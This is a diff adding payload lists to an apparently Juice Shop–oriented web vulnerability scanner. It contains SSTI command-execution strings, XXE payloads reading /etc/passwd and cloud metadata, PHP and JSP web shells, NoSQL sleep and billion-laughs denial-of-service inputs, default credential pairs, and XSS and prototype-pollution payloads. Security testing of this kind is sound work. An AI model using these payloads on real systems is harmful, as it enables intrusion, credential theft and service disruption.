@@ -568,3 +568,306 @@ COMMON_SENSITIVE_PATHS = [
     # Cloud
     "/latest/meta-data/", "/computeMetadata/v1/",
 ]
+
+# ── SSTI (Server-Side Template Injection) ────────────────────────────────────
+SSTI_PAYLOADS = [
+    "{{7*7}}",              # Jinja2/Twig — if output is 49, SSTI confirmed
+    "${7*7}",               # Freemarker/EL
+    "<%= 7*7 %>",           # ERB (Ruby)
+    "#{7*7}",               # Ruby
+    "{{7*'7'}}",            # Jinja2 — outputs 7777777, not 49
+    "{{config}}",           # Jinja2 config dump
+    "{{request.environ}}", # Jinja2 environment
+    "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",  # Freemarker RCE
+    "{{''.__class__.__mro__[2].__subclasses__()}}",  # Jinja2 subclasses
+    "*{7*7}",               # Spring Expression Language (SpEL)
+    "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}",  # Twig RCE
+]
+
+SSTI_INDICATORS = [
+    "49",          # 7*7 math result — only valid if we injected the payload
+    "7777777",     # Jinja2 string multiply
+    "root:",       # /etc/passwd via RCE
+    "uid=",        # `id` command output
+]
+
+SSTI_TEST_FIELDS = [
+    "name", "title", "message", "comment", "subject", "description",
+    "feedback", "body", "content", "text", "template", "email",
+]
+
+# ── NoSQL Injection ────────────────────────────────────────────────────────────
+NOSQL_INJECTION_PAYLOADS = [
+    # MongoDB operator injection via JSON body
+    {"$gt": ""},           # always true in MongoDB
+    {"$ne": None},         # not-equal null — matches all
+    {"$regex": ".*"},      # regex wildcard
+    {"$where": "1==1"},    # JavaScript injection
+]
+
+NOSQL_URL_PAYLOADS = [
+    # URL param injection for MongoDB
+    "[$gt]=",
+    "[$ne]=invalid",
+    "[$regex]=.*",
+    "[%24gt]=",
+]
+
+NOSQL_REST_ENDPOINTS = [
+    # Endpoints known to use NoSQL / accept operator injection
+    ("/rest/products/search", "q"),
+    ("/api/search", "q"),
+    ("/api/users/search", "q"),
+    ("/api/products/search", "q"),
+]
+
+NOSQL_SLEEP_PAYLOADS = [
+    # NoSQL DoS via $where JavaScript sleep
+    '{"$where": "function(){var date = new Date(); var curDate = null; do { curDate = new Date(); } while(curDate-date<5000); return Math.max();}"}',
+    '0;var date=new Date(); var curDate=null; do{ curDate=new Date(); } while(curDate-date<5000)',
+]
+
+# ── XXE (XML External Entity) ─────────────────────────────────────────────────
+XXE_PAYLOADS = [
+    # Classic XXE — read /etc/passwd
+    """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+<foo>&xxe;</foo>""",
+
+    # Classic XXE — read Windows system.ini
+    """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini">]>
+<foo>&xxe;</foo>""",
+
+    # XXE OOB (out-of-band) via parameter entity
+    """<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://169.254.169.254/latest/meta-data/">%xxe;]>
+<foo>test</foo>""",
+
+    # XXE DoS — billion laughs
+    """<?xml version="1.0"?>
+<!DOCTYPE lolz [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+]>
+<root>&lol3;</root>""",
+
+    # SVG XXE (for file upload endpoints)
+    """<?xml version="1.0" standalone="yes"?>
+<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
+<text font-size="16" x="0" y="16">&xxe;</text>
+</svg>""",
+]
+
+XXE_INDICATORS = [
+    "root:", "/bin/bash", "/sbin/nologin",  # /etc/passwd
+    "[boot loader]", "for 16-bit app support",  # Windows system.ini
+    "ami-id", "instance-id",  # AWS metadata
+    "lol",  # billion laughs echo
+]
+
+XXE_CONTENT_TYPES = [
+    "application/xml",
+    "text/xml",
+    "application/x-www-form-urlencoded",  # XML in body
+]
+
+# ── File Upload ────────────────────────────────────────────────────────────────
+# Source: Upload vulnerabilities common in Juice Shop + real bugs
+FILE_UPLOAD_PATHS = [
+    "/file-upload", "/api/file-upload", "/upload", "/api/upload",
+    "/api/v1/upload", "/import", "/api/import",
+    "/profile/image", "/api/profile/image",
+    "/api/users/photo", "/photo-wall",
+]
+
+FILE_UPLOAD_BYPASS_EXTENSIONS = [
+    # Extension bypass payloads (for servers that check extension not content-type)
+    ".php%00.jpg",    # null byte truncation
+    ".php\x00.jpg",   # null byte binary
+    ".php5",          # alternative PHP extension
+    ".phtml",
+    ".jsp",
+    ".jspx",
+    ".asp",
+    ".aspx",
+    ".shtml",
+    ".shtm",
+    ".cgi",
+    ".cfm",          # ColdFusion
+]
+
+FILE_UPLOAD_MALICIOUS_CONTENT = {
+    "php": b"<?php system($_GET['cmd']); ?>",
+    "jsp": b"<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
+    "svg_xxe": b'<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><svg><text>&xxe;</text></svg>',
+    "zip_slip": None,  # generated dynamically
+    "billion_laughs": b'<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;">]><root>&lol2;</root>',
+}
+
+# ── Information Disclosure ─────────────────────────────────────────────────────
+# FTP / backup / source / config file paths
+INFO_DISCLOSURE_PATHS = [
+    # Juice Shop specific
+    "/ftp", "/ftp/", "/ftp/acquisitions.md",
+    "/ftp/package.json.bak",
+    "/ftp/coupons_2013.md.bak",
+    "/ftp/legal.md",
+    "/ftp/eastere.gg",
+    "/ftp/suspicious_errors.yml",
+    # Common backup / forgotten files
+    "/backup", "/backup/", "/.backup",
+    "/db.sql", "/database.sql", "/dump.sql", "/backup.sql",
+    "/config.bak", "/web.config.bak",
+    "/package.json", "/package-lock.json", "/yarn.lock",
+    "/composer.json", "/composer.lock",
+    "/Gemfile", "/Gemfile.lock",
+    "/requirements.txt", "/Pipfile",
+    "/Makefile", "/Dockerfile", "/docker-compose.yml",
+    "/nginx.conf", "/apache2.conf", "/.htaccess", "/.htpasswd",
+    "/.env", "/.env.local", "/.env.production", "/.env.backup",
+    "/.git/config", "/.git/HEAD", "/.git/COMMIT_EDITMSG",
+    "/.svn/entries", "/.DS_Store",
+    "/robots.txt", "/sitemap.xml",
+    "/.well-known/security.txt",
+    "/crossdomain.xml", "/clientaccesspolicy.xml",
+    # Source code disclosure
+    "/index.php.bak", "/index.php~",
+    "/application.py.bak", "/app.py.bak",
+    "/server.js.bak", "/app.js.bak",
+    # Log files
+    "/access.log", "/error.log", "/app.log",
+    "/logs/access.log", "/logs/error.log",
+    "/var/log/nginx/access.log",
+    # IDE/editor files
+    "/.idea/workspace.xml", "/.vscode/settings.json",
+]
+
+INFO_DISCLOSURE_INDICATORS = {
+    "/ftp": ["acquisitions", "package.json", "legal", "coupons", "eastere"],
+    "/.env": ["DB_PASSWORD", "SECRET_KEY", "API_KEY", "DATABASE_URL", "REDIS_URL"],
+    "/.git/config": ["[core]", "repositoryformatversion", "filemode"],
+    "/package.json": ['"name"', '"version"', '"dependencies"'],
+    "/.htpasswd": ["$apr1$", ":{SHA}", "$2y$"],
+    "/access.log": ["GET /", "POST /", "HTTP/1.1", "200", "404"],
+    "/robots.txt": ["Disallow:", "Allow:", "User-agent:"],
+    "/.well-known/security.txt": ["Contact:", "Encryption:", "Acknowledgments:"],
+}
+
+# ── Broken Authentication / Weak Credentials ───────────────────────────────────
+WEAK_CREDENTIAL_PAIRS = [
+    # Admin credentials — Juice Shop default + common defaults
+    ("admin@juice-sh.op", "admin123"),
+    ("admin@juice-sh.op", "admin"),
+    ("admin@juice-sh.op", "password"),
+    ("admin@juice-sh.op", "12345"),
+    ("admin", "admin"),
+    ("admin", "admin123"),
+    ("admin", "password"),
+    ("admin", "123456"),
+    ("administrator", "administrator"),
+    ("root", "root"),
+    ("root", "toor"),
+    ("test@test.com", "test"),
+    ("test@test.com", "test123"),
+    ("user@example.com", "password"),
+    ("demo@demo.com", "demo"),
+    # Common REST API test accounts
+    ("customer1@juice-sh.op", "customer1"),
+    ("bender@juice-sh.op", "OhG0dPlease1sThisStheRealBender!"),
+    ("jim@juice-sh.op", "ncc-1701"),
+]
+
+# ── Prototype Pollution ────────────────────────────────────────────────────────
+PROTOTYPE_POLLUTION_PAYLOADS = [
+    # JSON body prototype pollution
+    {"__proto__": {"isAdmin": True}},
+    {"constructor": {"prototype": {"isAdmin": True}}},
+    {"__proto__": {"role": "admin"}},
+    {"__proto__": {"admin": True}},
+    # URL query prototype pollution
+    "__proto__[isAdmin]=true",
+    "constructor[prototype][isAdmin]=true",
+    "__proto__[role]=admin",
+]
+
+# ── Insecure Deserialization ───────────────────────────────────────────────────
+DESERIALIZATION_PATHS = [
+    "/api/import", "/import", "/api/deserialize",
+    "/api/restore", "/restore", "/api/backup/restore",
+]
+
+# ── Mass Assignment / Admin Registration ───────────────────────────────────────
+MASS_ASSIGNMENT_ROLE_FIELDS = [
+    {"role": "admin"},
+    {"role": "administrator"},
+    {"isAdmin": True},
+    {"is_admin": True},
+    {"admin": True},
+    {"roles": ["admin"]},
+    {"permissions": ["admin"]},
+    {"tier": "premium"},
+    {"subscription": "deluxe"},
+]
+
+# ── Business Logic Attacks ─────────────────────────────────────────────────────
+# Juice Shop specific + general business logic
+BUSINESS_LOGIC_BASKET_ATTACKS = [
+    # Negative quantity to make order total negative (get money)
+    {"quantity": -100},
+    {"quantity": -1},
+    # Zero price manipulation
+    {"price": 0},
+    {"price": -0.01},
+    # Integer overflow
+    {"quantity": 2147483647},
+]
+
+COUPON_CODES = [
+    # Known Juice Shop expired + active coupons
+    "WMNSDY2019", "WMNSDY2020", "WMNSDY2021",
+    "ORANGE2021", "ORANGE2022",
+    "DISCOUNT10", "PROMO15",
+    "test", "admin", "coupon", "free",
+    "BOGO", "SAVE50", "FREE100",
+]
+
+# ── JWT Attack Payloads ────────────────────────────────────────────────────────
+JWT_ALG_NONE_VARIANTS = [
+    "none", "None", "NONE", "nOnE",
+    "none ", "none\t", "none\n",  # whitespace variants
+]
+
+# ── Sensitive API Endpoints (Authenticated) ────────────────────────────────────
+# These endpoints should require auth but often don't
+SENSITIVE_AUTH_ENDPOINTS = [
+    # Juice Shop specific
+    ("/rest/user/whoami", "GET"),
+    ("/rest/basket/1", "GET"),
+    ("/rest/basket/2", "GET"),
+    ("/api/Users", "GET"),
+    ("/api/Users/1", "GET"),
+    ("/api/Users/2", "GET"),
+    ("/api/Feedbacks", "GET"),
+    ("/api/Orders", "GET"),
+    # Generic sensitive endpoints
+    ("/api/admin/users", "GET"),
+    ("/api/v1/users", "GET"),
+    ("/api/profile", "GET"),
+    ("/api/me", "GET"),
+]
+
+# ── DOM XSS Payloads ───────────────────────────────────────────────────────────
+DOM_XSS_PAYLOADS = [
+    '<iframe src="javascript:alert(`xss`)">',
+    '<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/770733527&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>',
+    '<script>alert(`xss`)</script>',
+    'javascript:alert(`xss`)',
+]
+
+DOM_XSS_SINK_PARAMS = [
+    # URL params commonly used as DOM sinks
+    "q", "search", "#", "to", "redirect", "lang", "currency",
+]
